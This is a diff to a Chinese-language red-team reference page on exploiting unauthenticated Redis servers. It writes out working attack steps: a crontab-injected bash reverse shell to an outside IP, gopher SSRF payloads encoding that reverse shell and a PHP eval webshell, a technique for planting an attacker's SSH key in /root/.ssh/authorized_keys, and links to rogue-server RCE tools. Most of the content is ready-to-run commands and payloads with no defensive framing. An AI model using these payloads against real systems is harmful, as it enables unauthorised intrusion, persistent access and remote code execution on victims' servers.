@@ -11,6 +11,7 @@
 - [细数 redis 的几种 getshell 方法](http://b1ue.cn/archives/318.html)
 - [Redis 常见漏洞利用方法总结](https://mp.weixin.qq.com/s/JMGD-xUwu6bw9Uh7IKcl1A)
 - [【创宇小课堂】渗透测试-Redis未授权访问漏洞利用](https://mp.weixin.qq.com/s/SG_5lXOFa0QSxdCUZVI9QQ)
+- [Redis 常见漏洞利用方法总结](https://www.freebuf.com/articles/network/280984.html)
 
 **相关工具**
 - [yuyan-sec/RedisEXP](https://github.com/yuyan-sec/RedisEXP) - Redis 漏洞利用工具
@@ -59,28 +60,41 @@ redis-cli -h <目标IP>
 > CONFIG GET dbfilename # 获取默认的 rdb 文件名
 ```
 
-**利用计划任务执行命令反弹 shell**
+### 利用计划任务执行命令反弹 shell
 
 在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 4444` 然后执行命令:
 ```bash
 config set dir /var/spool/cron
 config set dbfilename root
+# payload
 set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.1.1/4444 0>&1\n\n"
 save
 ```
+
+这个方法只能 Centos 上使用，Ubuntu 上行不通，原因如下：
+
+因为默认 redis 写文件后是 644 的权限，但 ubuntu 要求执行定时任务文件 `/var/spool/cron/crontabs/<username>` 权限必须是 600 也就是 -rw------- 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 `/var/spool/cron/<username >` 权限 644 也能执行
+
+因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错
+
+由于系统的不同，crontrab 定时文件位置也会不同：
+- Centos 的定时任务文件在 `/var/spool/cron/<username>`
+- Ubuntu 定时任务文件在 `/var/spool/cron/crontabs/<username>`
 
 gopher payload
 ```
 curl -v "gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >&/dev/tcp/192.168.1.1/8888>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$4%0d%0aroot%0d%0a*1%0d%0a\$4%0d%0asave%0d%0aquit%0d%0a"
 ```
 
-**写 ssh-keygen 公钥然后使用私钥登录**
+### 写 ssh-keygen 公钥然后使用私钥登录
+
+原理就是在数据库中插入一条数据，将本机的公钥作为 value，key 值随意，然后通过修改数据库的默认路径为 `/root/.ssh` 和默认的缓冲文件 `authorized.keys` ，把缓冲的数据保存在文件里，这样就可以在服务器端的 `/root/.ssh` 下生成一个授权的 key。
 
 在以下条件下,可以利用此方法
 1. Redis 服务使用 ROOT 账号启动
 2. 服务器开放了 SSH 服务,而且允许使用密钥登录,即可远程写入一个公钥,直接登录远程服务器.
 
-首先在本地生成一对密钥
+首先在攻击机本地生成一对密钥
 ```bash
 ssh-keygen -t rsa
 ```
@@ -95,6 +109,8 @@ cat test.txt | redis -cli -h <hostname> -x set test
 redis-cli -h <hostname>
 keys *
 get test
+
+# 设置 Redis 的备份路径为 /root/.ssh / 和保存文件名为 authorized_keys ，并将数据保存在目标服务器硬盘上
 config set dir "/root/.ssh"
 config set dbfilename "authorized_keys"
 save
@@ -103,7 +119,7 @@ save
 
 如果报错 `(error) ERR Changing directory: No such file or directory` 可能是因为 root 从来没有登录过
 
-**往 web 物理路径写 webshell**
+### 往 web 物理路径写 webshell
 
 当 redis 权限不高时,并且服务器开着 web 服务,在 redis 有 web 目录写权限时,可以尝试往 web 路径写 webshell,执行以下命令
 ```bash
@@ -121,12 +137,16 @@ set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
 
 `\r\n\r\n` 代表换行，用 redis 写入文件的话会自带一些版本信息，如果不换行的话可能会导致无法执行, 可见下图
 
-![](../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/1.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/Redis/1.png)
 
 gopher payload
 ```
 gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0ax%0d%0a\$25%0d%0a%3C%3Fphp%20%40eval(%24_POST%5Bc%5D)%3B%3F%3E%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$13%0d%0a/var/www/html%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$9%0d%0ashell.php%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a
 ```
+
+### SSRF 配合 Redis 未授权访问漏洞进行攻击
+
+- [SSRF#配合 Redis 未授权访问漏洞进行攻击](../../Web安全/Web_Generic/SSRF.md#配合-redis-未授权访问漏洞进行攻击)
 
 ---
 
@@ -154,7 +174,7 @@ gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%
 - [n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
 - [0671/RedisModules-ExecuteCommand-for-Windows](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows)
 - [LoRexxar/redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)
-- [No-Github/redis-rogue-server-win](https://github.com/No-Github/redis-rogue-server-win)
+- [No-Github/redis-rogue-server-win](https://github.com/No-Github/redis-rogue-server-win) - Redis 4.x & 5.x RCE
 - [r35tart/RedisWriteFile](https://github.com/r35tart/RedisWriteFile) - 通过 Redis 主从写出无损文件
 - [Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)
 - [0671/RabR](https://github.com/0671/RabR)
